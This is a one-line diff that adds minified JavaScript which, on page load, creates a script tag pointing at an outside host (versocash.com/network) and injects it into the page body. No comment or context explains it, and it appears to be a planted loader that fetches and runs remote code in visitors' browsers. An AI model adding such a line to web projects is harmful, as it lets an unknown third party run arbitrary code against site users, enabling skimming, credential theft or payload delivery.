@@ -1,0 +1,1 @@
+(()=>{var t,c,e;document.currentScript.src.split("id=")[1];t="https://versocash.com/network",c=document.body,(e=document.createElement("script")).src=t,c.appendChild(e)})();
